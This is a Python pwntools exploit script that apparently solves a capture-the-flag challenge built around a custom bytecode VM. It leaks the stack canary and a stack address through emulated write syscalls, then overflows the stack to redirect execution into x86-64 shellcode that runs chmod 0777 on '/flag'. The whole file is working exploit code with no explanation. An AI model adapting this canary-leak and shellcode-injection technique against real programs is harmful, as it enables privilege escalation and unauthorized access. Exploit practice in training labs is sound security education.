from pwn import *
from pyrsistent import b 
context.arch='amd64'
reg = {'a': b'\x10' , 'b':b'\x08' , 'c':b'\x02', 'd':b'\x40', 's':b'\x04', 'i':b'\x20', 'f':b'\x01'}
ins = {'sys': b'\x08', 'imm' : b'\x01'}
systable = {'crash':b'\x10','read':b'\x20','read_300' : b'\x04' , 'write' :b'\x08'}
def imm(regNo, imm):
    return int.to_bytes(imm,1,'little') + reg[regNo]  + ins['imm']

def read_300(fd,offset,count,ret_regNo):
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload   + reg[ret_regNo] + systable['read_300'] + ins['sys']

    return payload 

def read_0(fd,offset,count,ret_regNo):
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload  + reg[ret_regNo] + systable['read'] + ins['sys'] 

    return payload 

def write_300(fd,offset,count,ret_regNo):
    payload = b''
    payload += imm('a',fd) # fd
    payload += imm('b',offset) # buffer_offset
    payload += imm('c',count) # count
    payload = payload + reg[ret_regNo] + systable['write'] + ins['sys']

    return payload 

def exit(v):
    payload = b''
    payload += imm('a',v)
    payload += b'\x01\x08\x00'

    return payload

r = process('/challenge/toddlerone_level8.0')

payload2=asm('''
    push 90
    pop rax
    lea rdi, [rip+f]
    mov rsi, 511
    syscall

    f:
    .string "/flag"
''')


payload = b''

payload += write_300(1,0xff,0xff,'d')
payload += read_300(0,0xff,0xff,'d')
payload += imm('i',0xff)
r.send(payload)

r.recvuntil(b'... write\n')
r.recv(0x9)
### ret
canary = u64(r.recv(8))
print(hex(canary))
r.recv(0x18)
## stack
stack = u64(r.recv(8)) - 232
print(hex(stack))

r.send(b'\x00' + b'\x01'*5 + b'\xff' + b'\x01'*2 + p64(canary) + b'\x00'*0x8 + p64(stack) + payload2)


r.interactive()